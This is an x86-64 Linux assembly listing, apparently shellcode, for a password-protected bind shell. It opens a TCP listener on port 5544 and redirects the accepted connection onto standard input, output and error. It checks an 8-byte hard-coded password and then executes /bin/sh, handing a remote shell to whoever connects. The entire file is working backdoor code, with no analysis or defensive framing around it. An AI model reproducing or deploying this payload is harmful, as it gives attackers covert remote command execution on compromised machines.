section .text

global _start

_start:
	xor rax,rax
	xor rdi,rdi
	xor rsi,rsi
	xor rdx,rdx
	xor r10,r10

	mov al,41
	mov dil,2
	mov sil,1
	syscall

	mov rdi,rax

	; bind()

	push r10
	mov dword[rsp-4],r10d
	mov word[rsp-6],0xa815
	mov word[rsp-8],0x2
	sub rsp,8
	mov rsi,rsp

	mov al,49
	mov dl,16
	syscall

	; listen()

	mov al,50
	mov rsi,r10
	syscall

	; accept()

	mov al,43
	mov rsi,r10
	mov rdx,r10
	syscall

	mov r10,rax

	; close

	mov al,3
	syscall


	;dup2
	
	mov sil,2
	mov dil,r10b

dup2:
	mov al,33
	syscall
	dec rsi
	jns dup2

	
	inc rsi

	; read()
	mov al,sil
	sub rsp,8
	mov rsi,rsp
	mov dl,0x8
	syscall

	mov rax,0x3230373038317830
	mov rdi,rsi
	scasq
	jnz exit

	; execve("/bin/sh")

	xor rax,rax
	push rax
	mov r10,0x68732f6e69622f2f
	push r10
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	mov al,59
	syscall



exit:
	mov dil,r10b
	mov al,3
	syscall

	mov al,60
	xor rdi,rdi
	syscall


